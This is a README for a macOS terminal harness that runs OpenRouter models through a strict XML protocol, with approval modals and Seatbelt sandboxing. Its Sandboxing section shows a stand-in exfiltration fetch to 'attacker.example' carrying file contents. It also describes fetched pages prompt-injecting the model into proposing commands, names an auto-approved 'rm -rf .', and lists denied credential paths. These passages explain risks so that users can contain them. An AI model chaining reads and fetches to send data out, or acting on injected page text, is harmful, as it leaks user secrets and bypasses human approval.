# ai-harness

A terminal agent harness for models served through [OpenRouter](https://openrouter.ai).
The prompt box is pinned to the bottom of the screen; the conversation scrolls above it.

## The protocol

Input is not sent as free text. Each prompt goes out wrapped in a single element:

```xml
<ai-harness-query>count the rust files in src</ai-harness-query>
```

The model must reply with exactly one of seven elements, and nothing else:

```xml
<ai-harness-shell>ls -1 src/*.rs | wc -l</ai-harness-shell>
```

```xml
<ai-harness-read>src/app.rs</ai-harness-read>
```

```xml
<ai-harness-fetch>https://doc.rust-lang.org/std/net/enum.IpAddr.html</ai-harness-fetch>
```

```xml
<ai-harness-edit file=src/app.rs>
<ai-harness-old>let x = 1;</ai-harness-old>
<ai-harness-new>let x = 2;</ai-harness-new>
</ai-harness-edit>
```

```xml
<ai-harness-write file=src/hello.rs>
fn main() { println!("hi"); }
</ai-harness-write>
```

```xml
<ai-harness-option>
<ai-harness-option-question>Which database should the schema target?</ai-harness-option-question>
<ai-harness-option-choice>Postgres</ai-harness-option-choice>
<ai-harness-option-choice>SQLite</ai-harness-option-choice>
</ai-harness-option>
```

```xml
<ai-harness-response>There are 8 Rust source files.</ai-harness-response>
```

The contract is sent as the system prompt on every request, and replies are
validated strictly — prose around the tag, a markdown code fence, two elements,
an unknown tag, an attribute where none is allowed, or an empty body are all
rejected rather than guessed at, so protocol drift surfaces immediately. A
rejected reply is shown in the transcript as a `protocol error` alongside the raw
text the model actually sent.

A shell command or file write runs only after you approve it, and its result is
fed back (`<ai-harness-shell-result>` / `<ai-harness-write-result>`), so the model
can keep working until it returns a final response. `<ai-harness-write>` replaces
the whole named file; its contents are preserved byte-for-byte (only the single
formatting newline after `>` is stripped).

`<ai-harness-read>` is the exception: it mutates nothing, so it runs immediately
with **no approval prompt** and the contents come straight back as
`<ai-harness-read-result>`. That is the point of having it as its own element
rather than leaving reads to `cat` — an agent that wants to look at four files
before doing anything should not interrupt you four times first. It earns that
by being confined more tightly than the shell is: reads resolve to a real path
inside the working directory or they fail. To read anything outside, the model
has to use `<ai-harness-shell>`, which you approve as usual. Pass
`--confirm-reads` to put reads behind the modal too.

`<ai-harness-fetch>` is auto-approved on the same reasoning — an agent that
wants to check three documentation pages should not interrupt you three times —
but it earns it differently, and the difference matters. A read is *more*
confined than the shell. A fetch cannot be: it is an outbound request to a host
the model picked. What bounds it is a policy on the destination rather than a
filesystem root: **https only**, and **no addresses on this machine or this
network** — loopback, private, link-local (including the `169.254.169.254`
cloud-metadata endpoint), and the other special-purpose ranges are all refused.

That check runs inside the HTTP client's own DNS resolver, not as a lookup
beforehand. Checking first and connecting after leaves a DNS-rebinding race,
because the client resolves again when it connects; and pinning the first
address does not help, because a redirect resolves a fresh host. As the
resolver, the check is the one thing every hop and every new connection must
pass through. Redirects are capped and each hop's URL is re-checked.

The page comes back as text, not HTML: script, style, and navigation subtrees
are dropped, block tags become line breaks, and entities are decoded — a real
documentation page arrives as ~18 KB of readable text instead of ~125 KB of
markup. `<pre>` is the exception to the flattening and keeps its line breaks and
indentation, because in a coding harness the code examples are usually the point
of the page. Non-HTML content types (JSON, Markdown, plain text) pass through
untouched. Pass `--confirm-fetch` to put fetches behind the modal.

To be straight about what this is worth: on macOS you could get comparable text
out of `curl -s URL | textutil -convert txt -stdin -stdout`, and the shell
already bounds output and time. What the element actually buys is that it runs
**without interrupting you**, that the model reaches for it reliably from the
contract instead of having to remember a two-command pipeline, and that a
refusal comes back as something it can act on rather than a shell exit code.
The destination policy above is the price of that first property — take
auto-approval away and most of it would be redundant with the modal.

`<ai-harness-edit>` changes part of a file by exact search-and-replace: the
`<ai-harness-old>` text must appear **exactly once** in the file, and it is
swapped for `<ai-harness-new>` (an empty `<ai-harness-new>` deletes it). This is
how the model should change an existing file — it costs tokens proportional to
the change, not the whole file, and it cannot silently drop the parts it did not
mean to touch, the way a full rewrite can. If the old text is missing or
ambiguous, the edit is **rejected before you ever see a modal** and handed back
to the model to fix; you are only asked to approve edits that will actually
apply, and the approval shows a `-`/`+` diff. Under the hood an approved edit
runs as an ordinary sandboxed write of the whole resolved file, so nothing about
the confinement changes. `<ai-harness-write>` is still there for creating a new
file or a deliberate full rewrite.

`<ai-harness-option>` is the model asking *you* something. It could already ask a
question by putting one in `<ai-harness-response>` — but that **ends the turn**, so
answering meant typing a fresh prompt and the model resumed from a standing start.
That cost pushes a model toward guessing on exactly the decisions worth stopping
for. This makes asking cheap: the question comes up as a modal, `↑`/`↓` or `1`-`9`
picks an answer, `Enter` sends it, and **the loop carries straight on** — the
answer goes back as a result like any other.

A final row lets you type an answer that was not offered, and the model is told
which happened: picking one of its choices and writing your own mean different
things, and the second says its options were wrong. `Esc` dismisses the question,
which is also reported, so the model proceeds with a stated assumption rather than
stalling on an answer that is never coming.

Two properties worth knowing. A question is **never auto-approved**: it is not an
approval, so `--auto-approve` cannot see it and cannot answer for you — the one
thing in the protocol that always reaches a person. And an
`<ai-harness-option-result>` written by the model is rejected as fabrication, the
same as any other invented result; putting words in your mouth is the version of
that failure worth guarding hardest.

A `<ai-harness-response>` renders as **markdown** — headings, bullet and numbered
lists, blockquotes, rules, inline code, bold and italic, links, and fenced code
blocks, which get the same syntax highlighting a write or an edit does. Models
write markdown whether or not anything renders it, so the alternative was leaving
`##` and `**` on screen as punctuation.

It is a subset, hand-rolled like the wrapping and highlighting: nested emphasis,
reference links, setext headings, tables, and HTML are not parsed and render as
literal text rather than breaking. Only responses go through it — a read or a
fetch stays verbatim, because when you ask to see a file you want its source. The
raw reply is always available in the `/debug` frames, which are recorded whether
or not debug is on.

If a reply fails validation, the harness tells the model exactly what was wrong
and asks again, up to `--max-retries` (default 3). After that it gives up and
rolls the failed exchange out of context, so a bad reply is not left behind as an
example to imitate. Retries are always on; `/debug` only changes what you see.

## Slash commands

Commands are handled locally and never sent to the model.

| Command | Action |
| --- | --- |
| `/debug` | Toggle showing the raw protocol sent and received |
| `/auto` | Toggle running actions without the approval modal (see [Sandboxing](#sandboxing)) |
| `/plan [task]` | Toggle plan mode; with a task, start planning it (see [Plan mode](#plan-mode)) |
| `/clear` | Clear the conversation, keeping the system prompt |
| `/save [name]` | Save the session now (auto-save is always on; this also names it) |
| `/load [name]` | Load a saved session; `/load` with no name opens a picker modal |
| `/rename <name>` | Rename the current session (the name it loads under) |
| `/fork [name]` | Branch into a new session, freezing the original |
| `/cost` | Cumulative tokens, time spent waiting, and estimated spend |
| `/help` | List the commands |
| `/quit` | Exit |

Typing `/` opens a completion menu above the prompt, narrowing as you type:

| Key | Action |
| --- | --- |
| `Tab` | Complete to the highlighted command |
| `↑` / `↓` | Move the highlight (wraps at both ends) |
| `Enter` | Run the highlighted command |

Because `Enter` runs the highlight, `/de` and `Enter` is enough — there is no
need to complete first. These keys only bind while the menu is open, so `Tab`
still indents and `↑`/`↓` are free otherwise. The menu lists canonical names
only; aliases (`/q`, `/h`, `/reset`, `/exit`) still work when typed in full.

An unrecognised command is reported rather than forwarded. Start a prompt with
`//` to send text that really does begin with a slash — which also suppresses
the menu.

`/debug` is a pure view toggle: frames are recorded whether or not it is on, so
turning it on reveals traffic that already happened rather than only what comes
next. `--debug` starts with it enabled.

```text
→ sent
<ai-harness-query>What is 2+2? Just answer.</ai-harness-query>

← received
<ai-harness-response>2+2 = 4.</ai-harness-response>
```

## Sandboxing

Commands run under macOS Seatbelt (`sandbox-exec`), rooted at the working
directory. Confinement is enforced by the kernel rather than by inspecting the
command text — a shell command is an arbitrary program, so no amount of string
validation makes it safe. Because the kernel checks the *resolved* path, symlink
escapes are covered too.

| | Policy |
| --- | --- |
| Writes | Confined to the working-directory subtree |
| Shell reads | Open, minus `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, Keychains, `.env` |
| `<ai-harness-read>` | Working-directory subtree only, minus the same denylist |
| `<ai-harness-fetch>` | Public https hosts only; never this machine or this network |
| Network | Allowed — the approval prompt is the control point |
| Timeout | 30s by default, killing the whole process group |
| Output | Capped at 32 KB per stream; a read at 64 KB |

The read element is deliberately stricter than the shell. It resolves the path
in process and refuses anything that lands outside the root — including a
symlink inside the root pointing out of it, because the check runs on the
*resolved* path, the same rule the kernel applies. Being auto-approved, it must
not be able to reach files you never agreed to send to OpenRouter; the denylist
is shared with the Seatbelt profile so the two cannot drift apart.

File writes go through the same Seatbelt confinement: the harness runs `tee` under
the sandbox with the path passed as an argv element (never shell text, so it
cannot inject) and the contents piped on stdin. A write outside the root is denied
by the kernel and reported as an error, never an escape.

By default every command, write, and edit is shown in an approval modal before it
runs. `←`/`→` move between Allow and Deny, `Enter` confirms, `y`/`n` are
shortcuts, and the buttons are clickable. Denial is reported to the model so it
can propose something else. An edit is resolved against the file *before* the
modal, so you are never asked to approve one that cannot apply.

Writes and edits are shown as a diff, syntax-highlighted for the language the
file extension implies:

```
rust · +1 -1
  fn main() {
-     println!("one");
+     println!("two");
  }
```

Unchanged lines are kept for orientation and elided once they are far from
anything that moved, so a one-line change in a large rewrite reads as a one-line
change. A write is diffed against the file it replaces — the harness reads the
target during pre-flight purely to show you this, which is not an
`<ai-harness-read>` and is never shown to the model. A brand-new file has no
"before", so it falls back to a bounded preview of what it will contain.

The same block is used by the modal and the transcript, which matters most under
`--auto-approve`: with no modal, the transcript is the only place a change is
ever seen.

`--auto-approve` (or `/auto` mid-session) skips the modal: actions run as soon as
the model proposes them, still inside the sandbox. It is meant for a long
unattended task, where a twenty-step refactor is otherwise twenty keypresses. The
transcript still records every action and its result, so you review after the fact
instead of before it, a red `auto-approve` marker sits in the status bar for as
long as the mode is on, and `Esc` still cancels whatever is running. **Read the
paragraph below on what it gives up before leaving it on.**

A command's output streams into an outlined window while it runs, so a slow build
looks different from a hang:

```
┌─ ⠋ cargo build --release ──────────────────────────────────
│    Compiling ai-harness v0.1.0
│ warning: unused variable `x`
│     Finished in 3.4s
└─ Esc cancels ──────────────────────────────────────────────
```

stderr shows in red, the newest output is kept when there is more than fits, and
the window is replaced by the ordinary result entry when the command exits. The
live view is display-only — the text sent to the model is the complete output
captured at the end, the same split streamed replies use.

A command's stdin is `/dev/null`, so there is nothing to type at while one runs:
anything waiting to be answered hits EOF and fails immediately rather than
sitting there. A command that needs an answer should be given it upfront — `yes |`,
`--yes`, or a heredoc — and when the *model* needs an answer it asks with
`<ai-harness-option>` instead, which works at any point rather than only while a
command happens to be running.

`--command-timeout` is an **idle** bound, not a total one: it resets whenever the
command produces output, so a command is killed after that long doing nothing
rather than that long running. A build that prints progress
for two minutes survives; a silent one still dies on schedule. A separate ceiling
of twenty times the timeout (ten minutes by default) stops a command that prints
forever from running forever.

The agentic loop is bounded by `--max-iterations` so a model that keeps proposing
actions cannot spin forever; reads and edits count against it like anything else.

**This confines the filesystem; it is not a security boundary against a
determined attacker.** Network is on, so any command you approve can send
anything it can read. Command output is also sent to OpenRouter, which means
reading a secret leaks it even with no network in the command itself — the `.env`
deny closes the obvious case, and the denylist is not exhaustive.

Two things `<ai-harness-fetch>` specifically does **not** do, both worth knowing
before you leave it auto-approved:

- **It does not stop exfiltration.** An auto-approved read followed by an
  auto-approved fetch of `https://attacker.example/?d=<file contents>` moves
  data off the machine with nobody asked. The address rules do not help here —
  the attacker's host is an ordinary public one. This is a real reduction in
  containment versus routing the network step through `curl`, where you would
  approve it. `--confirm-fetch` puts that approval back.
- **It does not bound what a page says.** Fetched text lands in the model's
  context, and a page can try to instruct it. The result is labelled as
  untrusted when it is handed over, but what actually contains this is
  structural: by default shell, write, and edit still require approval, so a
  page can persuade the model to *propose* something, not to do it. **This is
  the containment `--auto-approve` removes** — see below.

What auto-approve costs, stated plainly: the modal is the structural check in the
paragraph above. With it off, a fetched page that talks the model into proposing a
command gets that command run, inside the sandbox, with nobody asked. The sandbox
still bounds *where* a command can reach; it never bounded *whether* it runs —
that was the modal's job. Nor does the sandbox protect the working directory
itself: it is the root commands are confined *to*, so an auto-approved `rm -rf .`
is inside the boundary, not outside it. Use the mode on a tree you can restore
from git, and prefer `--confirm-fetch` alongside it if the task involves reading
the web.

Non-macOS platforms fail closed at startup rather than running commands
unsandboxed.

## Plan mode

`/plan` (or `/plan add a --json flag`, which enters the mode and starts on that
task) puts the harness in a state where it works out *what to do* before doing any
of it. The plan goes to `plan.md` in the current session's folder, which is also
why a session is a directory: rename or fork the session and the plan goes with it.

**While the mode is on, that plan file is the only writable path on the machine.**
This is the sandbox's rule, not a promise the model makes: the Seatbelt profile is
narrowed to a single `(allow file-write* (literal …))`, so it holds for a shell
command exactly as it does for `<ai-harness-write>`. Reads, fetches, and commands
that only look at things work normally, and that is how the research is meant to
happen. A write aimed anywhere else is refused before you are asked to approve it,
and the model is told why so it can put the plan where it belongs.

The cost of that is worth knowing up front: **anything that needs to write fails
while planning**, including `cargo build`, installs, formatters, and commands that
spill to a temporary file. That is the intended shape of the mode rather than a
limitation to work around — but it is the part most likely to surprise you.

The model is told to ask with `<ai-harness-option>` about anything the code cannot
settle, and to end its turn with `<ai-harness-response>` only once the plan is
written. That response is what raises the decision:

```
┌ execute this plan? ──────────────────────────┐
│ The plan is ready:                           │
│                                              │
│ .ai_harness/sessions/<name>/plan.md          │
│                                              │
│ Executing leaves plan mode, lifting the      │
│ write restriction.                           │
│                                              │
│      [  Execute  ]      Keep planning        │
└──────────────────────────────────────────────┘
```

`Execute` turns the mode off and starts a fresh turn that reads the plan and
carries it out — with writes unrestricted again, and the approval modal back to
being what stands between a proposal and a change. `Keep planning` returns you to
the prompt with the mode still on, so you can say what to change and let the model
revise the file. `/plan` on its own leaves the mode without executing anything.

Auto-approve is unaffected either way. It decides *whether you are asked*; the
narrowed profile decides *what can happen at all*, so an auto-approved command
during plan mode is still confined to reading.

## Setup

Put your OpenRouter key in a `.env` file next to the project (it is gitignored):

```bash
cp .env.example .env
```

Then edit `.env` and set `OPENROUTER_API_KEY`. An exported environment variable
works too and takes precedence over nothing — either source is fine.

## Running

```bash
cargo run
```

Pick a different model, either way:

```bash
cargo run -- --model openai/gpt-4o
```

```bash
OPENROUTER_MODEL=google/gemini-2.5-pro cargo run
```

Give it extra guidance (appended to the protocol contract, never replacing it):

```bash
cargo run -- --system "Prefer ripgrep over grep."
```

## Cost

The status bar carries a running token total once a session has spent anything,
and `/cost` prints the breakdown — requests, input and output tokens, and time
actually spent waiting on the model (not wall-clock, which would count the hours
a session sat idle).

Dollar figures need per-model rates, which differ and change, so they are given
rather than baked in — a hardcoded price table would go stale without anyone
noticing:

```bash
cargo run -- --price-in 0.60 --price-out 2.20
```

Both are dollars per million tokens, and **both** must be set before a cost
appears: input and output rates differ several-fold, so a number derived from one
of them would not be an estimate, it would just be wrong.

Totals are saved with the session and restored on `/load`. They survive `/clear`
— the tokens were bought whether or not the conversation was kept — and a reply
that fails protocol validation is counted too, since a retry loop costs real
money precisely when it is going wrong.

Other flags: `--workdir` sets the sandbox root (default: cwd),
`--command-timeout` the per-command limit in seconds, `--max-iterations` the
agentic loop bound, `--confirm-reads` puts file reads behind the approval modal
along with everything else, and `--confirm-fetch` does the same for URL fetches.
`--auto-approve` goes the other way and removes the modal entirely — read
[Sandboxing](#sandboxing) before using it. Every flag also has an environment
variable (`AI_HARNESS_AUTO_APPROVE`, and so on).

## Keys

| Key | Action |
| --- | --- |
| `Enter` | Send the prompt |
| `Alt+Enter` | Insert a newline (also `Shift+Enter` on terminals supporting the kitty keyboard protocol) |
| `Esc` | Interrupt the in-flight reply or running command (while busy) |
| `↑` / `↓` | Recall previous / next prompt (on an empty prompt) |
| `Ctrl+C` | Quit |
| `Ctrl+D` | Quit when the prompt is empty |
| `Ctrl+L` | Clear the conversation (keeps the system prompt) |
| `PageUp` / `PageDown` | Scroll the transcript |
| `Ctrl+↑` / `Ctrl+↓` | Scroll one line |
| `End` | Jump back to the newest message when scrolled up |
| `Ctrl+←` / `Ctrl+→` | Move one word left / right (also `Alt`) |
| `Ctrl+W` / `Ctrl+Backspace` | Delete the previous word (also `Alt+Backspace`) |
| `Ctrl+Delete` | Delete the next word (also `Alt+Delete`) |
| `Ctrl+U` | Delete to the start of the line |
| `Ctrl+K` | Clear the prompt |
| `Ctrl+A` / `Ctrl+E` | Start / end of line |
| `Ctrl+Home` / `Ctrl+End` | Start / end of the prompt |

While the model's question modal is up, the keyboard belongs to it:

| Key | Action |
| --- | --- |
| `↑` / `↓` | Move between the choices and the free-text row (wraps) |
| `1`–`9` | Pick that choice outright |
| `Enter` | Answer with the highlighted choice, or with what you typed |
| `Esc` | Dismiss the question (reported to the model, which then continues) |

The free-text row takes the same editing keys as the prompt, word motions and
word deletion included.

Typing goes to the free-text row **only while it is focused**, so a keystroke
aimed at a highlighted choice cannot vanish into a buffer you cannot see. Choices
are clickable too.

Mouse wheel scrolls the transcript. Scrolling up detaches the view; it re-attaches
to the bottom once you scroll back down (or press `End`).

On an empty prompt, `↑` recalls your previous prompts (most recent first) and `↓`
walks back toward the newest, then to an empty line. Editing a recalled prompt
ends the walk; clear the line and press `↑` to browse again. This history is your
session's typed prompts and survives `/clear`.

## Layout

```
┌ ai-harness ──────────────────┐
│ conversation, scrollable     │
│                              │
└──────────────────────────────┘
 ready  model  key hints
┌──────────────────────────────┐
│ > your prompt                │
└──────────────────────────────┘
```

The prompt box grows downward from a fixed bottom edge as you add lines, up to
10 rows, after which it scrolls internally.

When the harness needs something from you — an approval, a question, the `/load`
picker — it takes the prompt's place rather than floating over the conversation,
because it is the same thing: where you answer.

```
┌ ai-harness ──────────────────┐
│ conversation, still readable │
└──────────────────────────────┘
 approve  model  key hints
┌ run this command? ───────────┐
│ The model wants to run:      │
│                              │
│ cargo build --release        │
│                              │
│      [  Allow  ]    Deny     │
└──────────────────────────────┘
```

The panel sizes itself to its contents on the same rule the prompt follows, and
gives way before the transcript does: past its cap it scrolls internally rather
than squeezing the conversation out of view.

## Layout of the code

| File | Role |
| --- | --- |
| `src/main.rs` | Event loop; keys, request results, and the redraw tick |
| `src/protocol.rs` | Query encoding, the system prompt, and strict reply parsing |
| `src/command.rs` | Slash-command parsing, the command table, and completion |
| `src/sandbox.rs` | Seatbelt profile generation and the sandboxed command |
| `src/exec.rs` | Running commands: streamed output, idle timeout, output caps |
| `src/files.rs` | Resolving and reading files for `<ai-harness-read>` |
| `src/fetch.rs` | URL policy, fetching, and HTML-to-text for `<ai-harness-fetch>` |
| `src/diff.rs` | Line-by-line diffs of writes and edits, bounded for storage |
| `src/highlight.rs` | Language detection and tokenising for code blocks |
| `src/markdown.rs` | Markdown subset for rendering model responses |
| `src/ledger.rs` | Cumulative token accounting and the `/cost` report |
| `src/session.rs` | Session folders under `.ai_harness/` (`/save`, `/load`, `plan.md`) |
| `src/tui.rs` | Terminal setup/teardown (raw mode, alt screen, mouse, paste) |
| `src/ui.rs` | Rendering and layout |
| `src/app.rs` | Application state: transcript, history, request status |
| `src/input.rs` | The prompt buffer and its cursor |
| `src/wrap.rs` | Word wrapping shared by the prompt and transcript |
| `src/openrouter.rs` | The OpenRouter client |
| `src/config.rs` | CLI arguments and environment |

## Tests

```bash
cargo test
```

The suite covers wrapping, cursor movement, state transitions, rendering (via
ratatui's `TestBackend`), and the OpenRouter request/response format (against a
local socket — no network, no key).

Eight tests reach the network and are excluded by default. Four check that a
live model obeys the protocol, that a rejected reply recovers when sent our
correction, and that a real request streams in incrementally. Four more fetch
real pages — including one against a public hostname that resolves to
`127.0.0.1`, which only the guarded resolver can catch:

```bash
cargo test -- --ignored live_ --nocapture
```

## Notes

Replies stream in token by token (Server-Sent Events): the text appears live
below the transcript with a `▌` cursor while it arrives, and input stays frozen
until it completes. Because the protocol parser is strict and whole-reply, this
is display-only — the approval modal and command execution still fire only once
the full reply has arrived and parsed. A brief `⠋ thinking…` spinner covers the
gap before the first token.

## Cancelling

`Esc` interrupts an in-flight turn — a streaming reply or a running command —
and returns to `Idle` without quitting. A cancelled command has its whole process
group killed, reusing the same clean teardown as the timeout, so nothing is left
running. The partial streamed text is discarded (it was display-only) and the
transcript shows a `Cancelled.` notice.

Inside the approval modal, `Esc` still means **Deny** — refuse this command and
let the model try another. To abandon a turn entirely, deny, then `Esc` the reply
that follows.

Cancellation is cooperative: each in-flight `tokio` task carries a cancel signal
it selects on, and every task is tagged with a generation so that updates already
queued by a cancelled task are recognised as stale and dropped rather than
corrupting the next turn.

## Saving and loading sessions

The session **auto-saves after every turn**. Each session is a *folder*, under
`.ai_harness/` in the working directory:

```
.ai_harness/
└── sessions/
    └── <name>/
        ├── session.json
        ├── preview.txt
        └── plan.md
```

A folder rather than a file because the conversation is only the first thing a
session owns: `plan.md` is [plan mode](#plan-mode)'s output and sits beside it, and
a folder means `/rename` and `/fork` carry it along without knowing it exists.
`plan.md` is only there once a plan has been written.

`preview.txt` is the session's last few lines of prose, written on every save so
the `/load` picker can show what each session was about. It exists as its own file
because `session.json` runs to hundreds of kilobytes and the picker opens every
session at once — parsing them all to show three lines each would get slower the
longer you use the harness. It is derived data: delete it and the next save writes
it again.

`.ai_harness/` lives under the **sandbox root**, so sessions belong to the project
rather than to whichever directory you launched from: running against two projects
from one terminal keeps them apart, and running against one project from two
terminals finds the same sessions. `--sessions-dir` overrides the location and is
used exactly as given. The whole directory is gitignored.

Until you name it, each run writes to a per-launch `session-<timestamp>/`, so runs
never overwrite each other.

> Sessions saved before this layout (loose `sessions/*.json` files) are **not
> migrated and not read**. Nothing looks there any more; delete the old
> `sessions/` directory when you no longer want them.

- `/rename <name>` — rename the current session's folder (the name it loads
  under). Everything in the folder moves with it.
- `/fork [name]` — branch: freeze the current session where it is and keep talking
  under a new name. Both start identical and diverge from the fork point; the
  original is preserved to `/load` back.
- `/save [name]` — save now and, with a name, adopt it going forward.
- `/load <name>` — restore a session. `/load` with no name opens a picker: choose
  with `↑`/`↓` or the mouse, `Enter` or click to load, `Esc` to cancel. Each entry
  shows its name and the session's last few lines, so the list can be read rather
  than navigated — names are timestamps until you `/rename` them, and a timestamp
  says nothing about what a session was. Sessions saved before previews existed
  show a bare name until their next save.
- `/clear` — wipe the conversation, **including its saved file** (it is
  overwritten to the cleared state). Use `/fork` first if you want to keep it.

All of these work only when idle.

`session.json` is pretty-printed JSON holding the model conversation (`history`,
so you can keep talking) and the rendered transcript (so the screen comes back
exactly — labelled actions, command results, token counts). A `version` field
guards the format. `/clear` never touches saved files, so `/save`, `/clear`,
`/load` round-trips.

The model is recorded but not switched on load — it is fixed at startup, so
loading a session saved under a different model keeps the running one for new
turns and notes the difference.
